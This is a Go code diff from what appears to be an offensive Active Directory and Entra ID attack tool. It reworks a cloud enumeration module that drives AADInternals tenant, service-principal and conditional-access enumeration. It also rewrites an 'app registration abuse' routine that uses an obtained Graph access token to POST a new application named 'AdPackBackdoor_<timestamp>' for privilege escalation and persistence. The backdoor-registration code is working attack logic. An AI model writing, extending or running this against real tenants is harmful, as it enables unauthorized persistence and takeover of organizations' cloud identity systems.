@@ -1,18 +1,19 @@
 package modules
 
 import (
+	"adpack/core"
+	"adpack/tools"
+	"adpack/utils"
+	"bytes"
 	"context"
 	"encoding/json"
 	"fmt"
 	"log/slog"
+	"net/http"
 	"os"
 	"path/filepath"
 	"strings"
 	"time"
-
-	"adpack/core"
-	"adpack/tools"
-	"adpack/utils"
 )
 
 func RunCloudEnumeration(ctx context.Context, state *core.ADState, tenant, username, password string) *core.ToolResult {
@@ -49,7 +50,7 @@ func RunCloudEnumeration(ctx context.Context, state *core.ADState, tenant, usern
 	if hasTokens {
 		enumerateWithGraphRunner(ctx, state, result)
 	} else if username != "" && password != "" {
-		enumerateWithAADInternals(ctx, state, result, tenant, username, password)
+		enumerateWithAADInternals(ctx, state, result)
 	} else {
 		slog.Warn("no tokens or credentials available — skipping cloud enumeration")
 		return result
@@ -127,7 +128,7 @@ func tokensToGraphTokens(tokens []core.Token) *tools.GraphTokens {
 	return nil
 }
 
-func enumerateWithAADInternals(ctx context.Context, state *core.ADState, result *core.ToolResult, tenant, username, password string) {
+func enumerateWithAADInternals(ctx context.Context, state *core.ADState, result *core.ToolResult) {
 	if !tools.AADInternals.Available() {
 		slog.Warn("AADInternals not available — install with: Install-Module AADInternals")
 		return
@@ -135,21 +136,21 @@ func enumerateWithAADInternals(ctx context.Context, state *core.ADState, result 
 
 	slog.Info("enumerating Entra ID via AADInternals")
 
-	if cr, err := tools.AADInternals.RunTenantEnum(ctx, username, password); err == nil {
+	if cr, err := tools.AADInternals.RunTenantEnum(ctx); err == nil {
 		n := parseJSONResources(cr.Stdout, "user", result, state, "AADInternals")
 		slog.Info("AADInternals: discovered users", "count", n)
 	} else {
 		slog.Warn("AADInternals tenant enumeration failed", "error", err)
 	}
 
-	if cr, err := tools.AADInternals.RunSPEnum(ctx, username, password); err == nil {
+	if cr, err := tools.AADInternals.RunSPEnum(ctx); err == nil {
 		n := parseJSONResources(cr.Stdout, "service_principal", result, state, "AADInternals")
 		slog.Info("AADInternals: discovered service principals", "count", n)
 	} else {
 		slog.Warn("AADInternals service principal enumeration failed", "error", err)
 	}
 
-	if cr, err := tools.AADInternals.RunCAPEnum(ctx, username, password); err == nil {
+	if cr, err := tools.AADInternals.RunCAPEnum(ctx); err == nil {
 		n := parseJSONResources(cr.Stdout, "conditional_access_policy", result, state, "AADInternals")
 		slog.Info("AADInternals: discovered conditional access policies", "count", n)
 	} else {
@@ -469,19 +470,40 @@ func attemptAppRegistrationAbuse(ctx context.Context, state *core.ADState, resul
 	}
 
 	appName := fmt.Sprintf("AdPackBackdoor_%d", time.Now().Unix())
-	payload := `{"displayName":"` + appName + `","signInAudience":"AzureADMyOrg"}`
-	cr := utils.RunCommandCtx(ctx, "bash", []string{"-c", fmt.Sprintf(
-		`curl -s -X POST -H "Authorization: Bearer %s" -H "Content-Type: application/json" -d '%s' 'https://graph.microsoft.com/v1.0/applications'`,
-		graphTokens.AccessToken, payload,
-	)})
-	if !cr.Success {
-		slog.Warn("cloud privesc: app registration failed", "error", cr.Stderr)
-		utils.StepWarn(fmt.Sprintf("App registration failed: %s", cr.Stderr))
+	payload := map[string]string{
+		"displayName":    appName,
+		"signInAudience": "AzureADMyOrg",
+	}
+	body, err := json.Marshal(payload)
+	if err != nil {
+		slog.Warn("cloud privesc: marshal app payload failed", "error", err)
+		return
+	}
+
+	req, err := http.NewRequestWithContext(ctx, "POST", "https://graph.microsoft.com/v1.0/applications", bytes.NewReader(body))
+	if err != nil {
+		slog.Warn("cloud privesc: create request failed", "error", err)
+		return
+	}
+	req.Header.Set("Authorization", "Bearer "+graphTokens.AccessToken)
+	req.Header.Set("Content-Type", "application/json")
+
+	resp, err := http.DefaultClient.Do(req)
+	if err != nil {
+		slog.Warn("cloud privesc: app registration HTTP failed", "error", err)
+		utils.StepWarn(fmt.Sprintf("App registration failed: %s", err))
+		return
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode >= 300 {
+		slog.Warn("cloud privesc: app registration rejected", "status", resp.StatusCode)
+		utils.StepWarn(fmt.Sprintf("App registration failed (HTTP %d)", resp.StatusCode))
 		return
 	}
 
 	var appResp map[string]any
-	if err := json.Unmarshal([]byte(cr.Stdout), &appResp); err != nil {
+	if err := json.NewDecoder(resp.Body).Decode(&appResp); err != nil {
 		slog.Warn("cloud privesc: app response parse failed")
 		return
 	}
